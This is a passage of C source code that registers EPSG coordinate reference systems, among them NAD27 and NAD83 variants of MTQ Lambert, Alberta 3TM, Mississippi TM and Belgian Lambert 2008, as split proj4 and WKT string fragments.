\"\\\"Slovenia 1996\\\",DATUM[\\\"Slovenia_Geodetic_Datum_1996\\\"\");\n    add_srs_wkt (p, 2,\n        \",SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 3,\n        \"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 4,\n        \"G\\\",\\\"6765\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 5,\n        \",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY\");\n    add_srs_wkt (p, 6,\n        \"[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4765\\\"]],PROJE\");\n    add_srs_wkt (p, 7,\n        \"CTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_o\");\n    add_srs_wkt (p, 8,\n        \"rigin\\\",0],PARAMETER[\\\"central_meridian\\\",15],PARAMETER[\");\n    add_srs_wkt (p, 9,\n        \"\\\"scale_factor\\\",0.9999],PARAMETER[\\\"false_easting\\\",500\");\n    add_srs_wkt (p, 10,\n        \"000],PARAMETER[\\\"false_northing\\\",-5000000],UNIT[\\\"metre\");\n    add_srs_wkt (p, 11,\n        \"\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST\");\n    add_srs_wkt (p, 12,\n        \"],AXIS[\\\"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3794\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3795, \"epsg\", 3795,\n        \"NAD27 / Cuba Norte\");\n    add_proj4text (p, 0,\n        \"+proj=lcc +lat_1=23 +lat_2=21.7 +lat_0=22.35 +lon_0=-81 \");\n    add_proj4text (p, 1,\n        \"+x_0=500000 +y_0=280296.016 +datum=NAD27 +units=m +no_de\");\n    add_proj4text (p, 2,\n        \"fs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD27 / Cuba Norte\\\",GEOGCS[\\\"NAD27\\\",DATUM[\\\"N\");\n    add_srs_wkt (p, 1,\n        \"orth_American_Datum_1927\\\",SPHEROID[\\\"Clarke 1866\\\",6378\");\n    add_srs_wkt (p, 2,\n        \"206.4,294.9786982138982,AUTHORITY[\\\"EPSG\\\",\\\"7008\\\"]],AU\");\n    add_srs_wkt (p, 3,\n        \"THORITY[\\\"EPSG\\\",\\\"6267\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHO\");\n    add_srs_wkt (p, 4,\n        \"RITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199\");\n    add_srs_wkt (p, 5,\n        \"433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4\");\n    add_srs_wkt (p, 6,\n        \"267\\\"]],PROJECTION[\\\"Lambert_Conformal_Conic_2SP\\\"],PARA\");\n    add_srs_wkt (p, 7,\n        \"METER[\\\"standard_parallel_1\\\",23],PARAMETER[\\\"standard_p\");\n    add_srs_wkt (p, 8,\n        \"arallel_2\\\",21.7],PARAMETER[\\\"latitude_of_origin\\\",22.35\");\n    add_srs_wkt (p, 9,\n        \"],PARAMETER[\\\"central_meridian\\\",-81],PARAMETER[\\\"false_\");\n    add_srs_wkt (p, 10,\n        \"easting\\\",500000],PARAMETER[\\\"false_northing\\\",280296.01\");\n    add_srs_wkt (p, 11,\n        \"6],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"\");\n    add_srs_wkt (p, 12,\n        \"Y\\\",NORTH],AXIS[\\\"X\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3795\\\"]\");\n    add_srs_wkt (p, 13,\n        \"]\");\n    p = add_epsg_def (filter, first, last, 3796, \"epsg\", 3796,\n        \"NAD27 / Cuba Sur\");\n    add_proj4text (p, 0,\n        \"+proj=lcc +lat_1=21.3 +lat_2=20.13333333333333 +lat_0=20\");\n    add_proj4text (p, 1,\n        \".71666666666667 +lon_0=-76.83333333333333 +x_0=500000 +y\");\n    add_proj4text (p, 2,\n        \"_0=229126.939 +datum=NAD27 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD27 / Cuba Sur\\\",GEOGCS[\\\"NAD27\\\",DATUM[\\\"Nor\");\n    add_srs_wkt (p, 1,\n        \"th_American_Datum_1927\\\",SPHEROID[\\\"Clarke 1866\\\",637820\");\n    add_srs_wkt (p, 2,\n        \"6.4,294.9786982138982,AUTHORITY[\\\"EPSG\\\",\\\"7008\\\"]],AUTH\");\n    add_srs_wkt (p, 3,\n        \"ORITY[\\\"EPSG\\\",\\\"6267\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORI\");\n    add_srs_wkt (p, 4,\n        \"TY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.017453292519943\");\n    add_srs_wkt (p, 5,\n        \"3,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"426\");\n    add_srs_wkt (p, 6,\n        \"7\\\"]],PROJECTION[\\\"Lambert_Conformal_Conic_2SP\\\"],PARAME\");\n    add_srs_wkt (p, 7,\n        \"TER[\\\"standard_parallel_1\\\",21.3],PARAMETER[\\\"standard_p\");\n    add_srs_wkt (p, 8,\n        \"arallel_2\\\",20.13333333333333],PARAMETER[\\\"latitude_of_o\");\n    add_srs_wkt (p, 9,\n        \"rigin\\\",20.71666666666667],PARAMETER[\\\"central_meridian\\\"\");\n    add_srs_wkt (p, 10,\n        \",-76.83333333333333],PARAMETER[\\\"false_easting\\\",500000]\");\n    add_srs_wkt (p, 11,\n        \",PARAMETER[\\\"false_northing\\\",229126.939],UNIT[\\\"metre\\\"\");\n    add_srs_wkt (p, 12,\n        \",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Y\\\",NORTH],AXIS[\");\n    add_srs_wkt (p, 13,\n        \"\\\"X\\\",EAST],AUTHORITY[\\\"EPSG\\\",\\\"3796\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3797, \"epsg\", 3797,\n        \"NAD27 / MTQ Lambert\");\n    add_proj4text (p, 0,\n        \"+proj=lcc +lat_1=50 +lat_2=46 +lat_0=44 +lon_0=-70 +x_0=\");\n    add_proj4text (p, 1,\n        \"800000 +y_0=0 +datum=NAD27 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD27 / MTQ Lambert\\\",GEOGCS[\\\"NAD27\\\",DATUM[\\\"\");\n    add_srs_wkt (p, 1,\n        \"North_American_Datum_1927\\\",SPHEROID[\\\"Clarke 1866\\\",637\");\n    add_srs_wkt (p, 2,\n        \"8206.4,294.9786982138982,AUTHORITY[\\\"EPSG\\\",\\\"7008\\\"]],A\");\n    add_srs_wkt (p, 3,\n        \"UTHORITY[\\\"EPSG\\\",\\\"6267\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTH\");\n    add_srs_wkt (p, 4,\n        \"ORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.017453292519\");\n    add_srs_wkt (p, 5,\n        \"9433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 6,\n        \"4267\\\"]],PROJECTION[\\\"Lambert_Conformal_Conic_2SP\\\"],PAR\");\n    add_srs_wkt (p, 7,\n        \"AMETER[\\\"standard_parallel_1\\\",50],PARAMETER[\\\"standard_\");\n    add_srs_wkt (p, 8,\n        \"parallel_2\\\",46],PARAMETER[\\\"latitude_of_origin\\\",44],PA\");\n    add_srs_wkt (p, 9,\n        \"RAMETER[\\\"central_meridian\\\",-70],PARAMETER[\\\"false_east\");\n    add_srs_wkt (p, 10,\n        \"ing\\\",800000],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"met\");\n    add_srs_wkt (p, 11,\n        \"re\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",EAST],AX\");\n    add_srs_wkt (p, 12,\n        \"IS[\\\"Y\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3797\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3798, \"epsg\", 3798,\n        \"NAD83 / MTQ Lambert\");\n    add_proj4text (p, 0,\n        \"+proj=lcc +lat_1=50 +lat_2=46 +lat_0=44 +lon_0=-70 +x_0=\");\n    add_proj4text (p, 1,\n        \"800000 +y_0=0 +datum=NAD83 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83 / MTQ Lambert\\\",GEOGCS[\\\"NAD83\\\",DATUM[\\\"\");\n    add_srs_wkt (p, 1,\n        \"North_American_Datum_1983\\\",SPHEROID[\\\"GRS 1980\\\",637813\");\n    add_srs_wkt (p, 2,\n        \"7,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,\");\n    add_srs_wkt (p, 3,\n        \"0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6269\\\"]],PRIMEM[\\\"Gree\");\n    add_srs_wkt (p, 4,\n        \"nwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",\");\n    add_srs_wkt (p, 5,\n        \"0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORI\");\n    add_srs_wkt (p, 6,\n        \"TY[\\\"EPSG\\\",\\\"4269\\\"]],PROJECTION[\\\"Lambert_Conformal_Co\");\n    add_srs_wkt (p, 7,\n        \"nic_2SP\\\"],PARAMETER[\\\"standard_parallel_1\\\",50],PARAMET\");\n    add_srs_wkt (p, 8,\n        \"ER[\\\"standard_parallel_2\\\",46],PARAMETER[\\\"latitude_of_o\");\n    add_srs_wkt (p, 9,\n        \"rigin\\\",44],PARAMETER[\\\"central_meridian\\\",-70],PARAMETE\");\n    add_srs_wkt (p, 10,\n        \"R[\\\"false_easting\\\",800000],PARAMETER[\\\"false_northing\\\"\");\n    add_srs_wkt (p, 11,\n        \",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\");\n    add_srs_wkt (p, 12,\n        \"\\\"X\\\",EAST],AXIS[\\\"Y\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3798\\\"\");\n    add_srs_wkt (p, 13,\n        \"]]\");\n    p = add_epsg_def (filter, first, last, 3799, \"epsg\", 3799,\n        \"NAD83(CSRS) / MTQ Lambert\");\n    add_proj4text (p, 0,\n        \"+proj=lcc +lat_1=50 +lat_2=46 +lat_0=44 +lon_0=-70 +x_0=\");\n    add_proj4text (p, 1,\n        \"800000 +y_0=0 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units\");\n    add_proj4text (p, 2,\n        \"=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(CSRS) / MTQ Lambert\\\",GEOGCS[\\\"NAD83(CSRS\");\n    add_srs_wkt (p, 1,\n        \")\\\",DATUM[\\\"NAD83_Canadian_Spatial_Reference_System\\\",SP\");\n    add_srs_wkt (p, 2,\n        \"HEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EP\");\n    add_srs_wkt (p, 3,\n        \"SG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 4,\n        \",\\\"6140\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 5,\n        \"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 6,\n        \"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4617\\\"]],PROJECTI\");\n    add_srs_wkt (p, 7,\n        \"ON[\\\"Lambert_Conformal_Conic_2SP\\\"],PARAMETER[\\\"standard\");\n    add_srs_wkt (p, 8,\n        \"_parallel_1\\\",50],PARAMETER[\\\"standard_parallel_2\\\",46],\");\n    add_srs_wkt (p, 9,\n        \"PARAMETER[\\\"latitude_of_origin\\\",44],PARAMETER[\\\"central\");\n    add_srs_wkt (p, 10,\n        \"_meridian\\\",-70],PARAMETER[\\\"false_easting\\\",800000],PAR\");\n    add_srs_wkt (p, 11,\n        \"AMETER[\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\");\n    add_srs_wkt (p, 12,\n        \"\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",NORTH],A\");\n    add_srs_wkt (p, 13,\n        \"UTHORITY[\\\"EPSG\\\",\\\"3799\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3800, \"epsg\", 3800,\n        \"NAD27 / Alberta 3TM ref merid 120 W\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-120 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +datum=NAD27 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD27 / Alberta 3TM ref merid 120 W\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"NAD27\\\",DATUM[\\\"North_American_Datum_1927\\\",SPHEROID[\\\"C\");\n    add_srs_wkt (p, 2,\n        \"larke 1866\\\",6378206.4,294.9786982138982,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 3,\n        \"G\\\",\\\"7008\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"6267\\\"]],PRIMEM[\\\"Gr\");\n    add_srs_wkt (p, 4,\n        \"eenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\"\");\n    add_srs_wkt (p, 5,\n        \",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHOR\");\n    add_srs_wkt (p, 6,\n        \"ITY[\\\"EPSG\\\",\\\"4267\\\"]],PROJECTION[\\\"Transverse_Mercator\");\n    add_srs_wkt (p, 7,\n        \"\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PARAMETER[\\\"cent\");\n    add_srs_wkt (p, 8,\n        \"ral_meridian\\\",-120],PARAMETER[\\\"scale_factor\\\",0.9999],\");\n    add_srs_wkt (p, 9,\n        \"PARAMETER[\\\"false_easting\\\",0],PARAMETER[\\\"false_northin\");\n    add_srs_wkt (p, 10,\n        \"g\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AX\");\n    add_srs_wkt (p, 11,\n        \"IS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",NORTH],AUTHORITY[\");\n    add_srs_wkt (p, 12,\n        \"\\\"EPSG\\\",\\\"3800\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3801, \"epsg\", 3801,\n        \"NAD83 / Alberta 3TM ref merid 120 W\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-120 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +datum=NAD83 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83 / Alberta 3TM ref merid 120 W\\\",GEOGCS[\\\"\");\n    add_srs_wkt (p, 1,\n        \"NAD83\\\",DATUM[\\\"North_American_Datum_1983\\\",SPHEROID[\\\"G\");\n    add_srs_wkt (p, 2,\n        \"RS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"701\");\n    add_srs_wkt (p, 3,\n        \"9\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6269\\\"\");\n    add_srs_wkt (p, 4,\n        \"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],\");\n    add_srs_wkt (p, 5,\n        \"UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 6,\n        \"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4269\\\"]],PROJECTION[\\\"Tran\");\n    add_srs_wkt (p, 7,\n        \"sverse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],P\");\n    add_srs_wkt (p, 8,\n        \"ARAMETER[\\\"central_meridian\\\",-120],PARAMETER[\\\"scale_fa\");\n    add_srs_wkt (p, 9,\n        \"ctor\\\",0.9999],PARAMETER[\\\"false_easting\\\",0],PARAMETER[\");\n    add_srs_wkt (p, 10,\n        \"\\\"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 11,\n        \",\\\"9001\\\"]],AXIS[\\\"Easting\\\",EAST],AXIS[\\\"Northing\\\",NOR\");\n    add_srs_wkt (p, 12,\n        \"TH],AUTHORITY[\\\"EPSG\\\",\\\"3801\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3802, \"epsg\", 3802,\n        \"NAD83(CSRS) / Alberta 3TM ref merid 120 W\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=-120 +k=0.9999 +x_0=0 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(CSRS) / Alberta 3TM ref merid 120 W\\\",GEO\");\n    add_srs_wkt (p, 1,\n        \"GCS[\\\"NAD83(CSRS)\\\",DATUM[\\\"NAD83_Canadian_Spatial_Refer\");\n    add_srs_wkt (p, 2,\n        \"ence_System\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.25722210\");\n    add_srs_wkt (p, 3,\n        \"1,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],A\");\n    add_srs_wkt (p, 4,\n        \"UTHORITY[\\\"EPSG\\\",\\\"6140\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTH\");\n    add_srs_wkt (p, 5,\n        \"ORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.017453292519\");\n    add_srs_wkt (p, 6,\n        \"9433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 7,\n        \"4617\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"\");\n    add_srs_wkt (p, 8,\n        \"latitude_of_origin\\\",0],PARAMETER[\\\"central_meridian\\\",-\");\n    add_srs_wkt (p, 9,\n        \"120],PARAMETER[\\\"scale_factor\\\",0.9999],PARAMETER[\\\"fals\");\n    add_srs_wkt (p, 10,\n        \"e_easting\\\",0],PARAMETER[\\\"false_northing\\\",0],UNIT[\\\"me\");\n    add_srs_wkt (p, 11,\n        \"tre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"Easting\\\",E\");\n    add_srs_wkt (p, 12,\n        \"AST],AXIS[\\\"Northing\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3802\\\"\");\n    add_srs_wkt (p, 13,\n        \"]]\");\n    p = add_epsg_def (filter, first, last, 3812, \"epsg\", 3812,\n        \"ETRS89 / Belgian Lambert 2008\");\n    add_proj4text (p, 0,\n        \"+proj=lcc +lat_1=49.83333333333334 +lat_2=51.16666666666\");\n    add_proj4text (p, 1,\n        \"666 +lat_0=50.797815 +lon_0=4.359215833333333 +x_0=64932\");\n    add_proj4text (p, 2,\n        \"8 +y_0=665262 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units\");\n    add_proj4text (p, 3,\n        \"=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / Belgian Lambert 2008\\\",GEOGCS[\\\"ETRS89\");\n    add_srs_wkt (p, 1,\n        \"\\\",DATUM[\\\"European_Terrestrial_Reference_System_1989\\\",\");\n    add_srs_wkt (p, 2,\n        \"SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"\");\n    add_srs_wkt (p, 3,\n        \"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 4,\n        \"G\\\",\\\"6258\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\"\");\n    add_srs_wkt (p, 5,\n        \",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY\");\n    add_srs_wkt (p, 6,\n        \"[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJE\");\n    add_srs_wkt (p, 7,\n        \"CTION[\\\"Lambert_Conformal_Conic_2SP\\\"],PARAMETER[\\\"stand\");\n    add_srs_wkt (p, 8,\n        \"ard_parallel_1\\\",49.83333333333334],PARAMETER[\\\"standard\");\n    add_srs_wkt (p, 9,\n        \"_parallel_2\\\",51.16666666666666],PARAMETER[\\\"latitude_of\");\n    add_srs_wkt (p, 10,\n        \"_origin\\\",50.797815],PARAMETER[\\\"central_meridian\\\",4.35\");\n    add_srs_wkt (p, 11,\n        \"9215833333333],PARAMETER[\\\"false_easting\\\",649328],PARAM\");\n    add_srs_wkt (p, 12,\n        \"ETER[\\\"false_northing\\\",665262],UNIT[\\\"metre\\\",1,AUTHORI\");\n    add_srs_wkt (p, 13,\n        \"TY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",NORTH\");\n    add_srs_wkt (p, 14,\n        \"],AUTHORITY[\\\"EPSG\\\",\\\"3812\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3814, \"epsg\", 3814,\n        \"NAD83 / Mississippi TM\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=32.5 +lon_0=-89.75 +k=0.9998335 +x_0=\");\n    add_proj4text (p, 1,\n        \"500000 +y_0=1300000 +datum=NAD83 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83 / Mississippi TM\\\",GEOGCS[\\\"NAD83\\\",DATUM\");\n    add_srs_wkt (p, 1,\n        \"[\\\"North_American_Datum_1983\\\",SPHEROID[\\\"GRS 1980\\\",637\");\n    add_srs_wkt (p, 2,\n        \"8137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84\");\n    add_srs_wkt (p, 3,\n        \"[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6269\\\"]],PRIMEM[\\\"G\");\n    add_srs_wkt (p, 4,\n        \"reenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\");\n    add_srs_wkt (p, 5,\n        \"\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTH\");\n    add_srs_wkt (p, 6,\n        \"ORITY[\\\"EPSG\\\",\\\"4269\\\"]],PROJECTION[\\\"Transverse_Mercat\");\n    add_srs_wkt (p, 7,\n        \"or\\\"],PARAMETER[\\\"latitude_of_origin\\\",32.5],PARAMETER[\\\"\");\n    add_srs_wkt (p, 8,\n        \"central_meridian\\\",-89.75],PARAMETER[\\\"scale_factor\\\",0.\");\n    add_srs_wkt (p, 9,\n        \"9998335],PARAMETER[\\\"false_easting\\\",500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",1300000],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 11,\n        \"PSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",NORTH],AUTH\");\n    add_srs_wkt (p, 12,\n        \"ORITY[\\\"EPSG\\\",\\\"3814\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3815, \"epsg\", 3815,\n        \"NAD83(HARN) / Mississippi TM\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=32.5 +lon_0=-89.75 +k=0.9998335 +x_0=\");\n    add_proj4text (p, 1,\n        \"500000 +y_0=1300000 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 \");\n    add_proj4text (p, 2,\n        \"+units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(HARN) / Mississippi TM\\\",GEOGCS[\\\"NAD83(H\");\n    add_srs_wkt (p, 1,\n        \"ARN)\\\",DATUM[\\\"NAD83_High_Accuracy_Reference_Network\\\",S\");\n    add_srs_wkt (p, 2,\n        \"PHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORITY[\\\"E\");\n    add_srs_wkt (p, 3,\n        \"PSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\");\n    add_srs_wkt (p, 4,\n        \"\\\",\\\"6152\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 5,\n        \"\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\");\n    add_srs_wkt (p, 6,\n        \"\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4152\\\"]],PROJEC\");\n    add_srs_wkt (p, 7,\n        \"TION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"latitude_of_or\");\n    add_srs_wkt (p, 8,\n        \"igin\\\",32.5],PARAMETER[\\\"central_meridian\\\",-89.75],PARA\");\n    add_srs_wkt (p, 9,\n        \"METER[\\\"scale_factor\\\",0.9998335],PARAMETER[\\\"false_east\");\n    add_srs_wkt (p, 10,\n        \"ing\\\",500000],PARAMETER[\\\"false_northing\\\",1300000],UNIT\");\n    add_srs_wkt (p, 11,\n        \"[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],AXIS[\\\"X\\\",EA\");\n    add_srs_wkt (p, 12,\n        \"ST],AXIS[\\\"Y\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"3815\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3816, \"epsg\", 3816,\n        \"NAD83(NSRS2007) / Mississippi TM\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=32.5 +lon_0=-89.75 +k=0.9998335 +x_0=\");\n    add_proj4text (p, 1,\n        \"500000 +y_0=1300000 +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 \");\n    add_proj4text (p, 2,\n        \"+units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"NAD83(NSRS2007) / Mississippi TM\\\",GEOGCS[\\\"NAD\");\n    add_srs_wkt (p, 1,\n        \"83(NSRS2007)\\\",DATUM[\\\"NAD83_National_Spatial_Reference_\");\n    add_srs_wkt (p, 2,\n        \"System_2007\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.25722210\");\n    add_srs_wkt (p, 3,\n        \"1,AUTHORITY[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],A\");\n    add_srs_wkt (p, 4,\n        \"UTHORITY[\\\"EPSG\\\",\\\"6759\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTH\");\n    add_srs_wkt (p, 5,\n        \"ORITY[\\\"EPSG\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.017453292519\");\n    add_srs_wkt (p, 6,\n        \"9433,AUTHORITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 7,\n        \"4759\\\"]],PROJECTION[\\\"Transverse_Mercator\\\"],PARAMETER[\\\"\");\n    add_srs_wkt (p, 8,\n        \"latitude_of_origin\\\",32.5],PARAMETER[\\\"central_meridian\\\"\");\n    add_srs_wkt (p, 9,\n        \",-89.75],PARAMETER[\\\"scale_factor\\\",0.9998335],PARAMETER\");\n    add_srs_wkt (p, 10,\n        \"[\\\"false_easting\\\",500000],PARAMETER[\\\"false_northing\\\",\");\n    add_srs_wkt (p, 11,\n        \"1300000],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\\\"9001\\\"]],\");\n    add_srs_wkt (p, 12,\n        \"AXIS[\\\"X\\\",EAST],AXIS[\\\"Y\\\",NORTH],AUTHORITY[\\\"EPSG\\\",\\\"\");\n    add_srs_wkt (p, 13,\n        \"3816\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3819, \"epsg\", 3819,\n        \"HD1909\");\n    add_proj4text (p, 0,\n        \"+proj=longlat +ellps=bessel +towgs84=595.48,121.69,515.3\");\n    add_proj4text (p, 1,\n        \"5,4.115,-2.9383,0.853,-3.408 +no_defs\");\n    add_srs_wkt (p, 0,\n        \"GEOGCS[\\\"HD1909\\\",DATUM[\\\"Hungarian_Datum_1909\\\",SPHEROI\");\n    add_srs_wkt (p, 1,\n        \"D[\\\"Bessel 1841\\\",6377397.155,299.1528128,AUTHORITY[\\\"EP\");\n    add_srs_wkt (p, 2,\n        \"SG\\\",\\\"7004\\\"]],TOWGS84[595.48,121.69,515.35,4.115,-2.93\");\n    add_srs_wkt (p, 